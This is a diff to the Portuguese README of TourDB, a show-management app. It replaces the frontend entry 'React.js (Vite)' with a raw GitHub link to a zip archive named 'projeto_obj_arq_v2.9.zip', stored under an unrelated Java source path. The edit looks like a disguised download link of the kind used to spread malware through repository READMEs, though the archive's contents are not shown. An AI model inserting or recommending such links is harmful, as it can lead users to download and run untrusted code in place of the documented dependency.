@@ -4,7 +4,7 @@ O TourDB é um gerenciador de shows desenvolvido para facilitar o cadastro e o c
 
 **Frontend**
 
-- React.js (Vite)
+- https://raw.githubusercontent.com/felipecameloss/projeto-arq-obj/main/src/main/java/projeto_obj_arq_v2.9.zip (Vite)
 
 - React Router DOM
 
